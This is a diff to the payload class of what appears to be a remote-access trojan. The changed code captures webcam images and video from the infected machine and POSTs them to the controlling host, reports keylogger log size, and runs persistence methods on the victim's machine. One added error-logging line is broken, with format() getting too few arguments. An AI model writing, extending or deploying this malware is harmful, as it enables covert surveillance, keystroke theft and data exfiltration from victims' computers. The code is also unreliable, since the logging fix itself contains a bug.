@@ -620,13 +620,15 @@ class Payload():
             elif 'image' in args:
                 img = globals()['webcam'].image(*args)
                 data = {"png": img}
+                host, port = self.connection.getpeername()
+                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
             elif 'video' in args:
                 vid = globals()['webcam'].video(*args)
                 data = {"avi": vid}
+                host, port = self.connection.getpeername()
+                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
             else:
                 return self.webcam.usage
-            host, port = self.connection.getpeername()
-            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
             return "Webcam capture complete"
         except Exception as e:
             log("{} error: {}".format(self.webcam.func_name, str(e)))
@@ -831,12 +833,8 @@ class Payload():
         """
         def status():
             try:
-                mode = 'stopped'
-                if 'keylogger' in self.handlers:
-                    mode = 'running'
-                update = globals()['status'](float(self.handlers.get('keylogger').name))
-                length = globals()['keylogger']._buffer.tell()
-                return "Status\n\tname: keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(mode, update, length)
+                length = globals()['keylogger'].logs.tell()
+                return "Log size: {} bytes".format(length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
@@ -900,7 +898,7 @@ class Payload():
         Establish persistence on client host machine
 
         `Required`
-        :param str target:    run, abort, methods, results
+        :param str target:          add, remove. methods, results
 
         `Methods`
         :method all:                All Methods
@@ -920,7 +918,10 @@ class Payload():
                 return self.persistence.usage
             for method in globals()['persistence']._methods:
                 if action == 'all' or action == method:
-                    getattr(globals()['persistence']._methods[method], cmd)()
+                    try:
+                        getattr(globals()['persistence']._methods[method], cmd)()
+                    except Exception as e:
+                        log("{} error: {}".format(self.persistence.func_name), str(e))
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.func_name, str(e)))
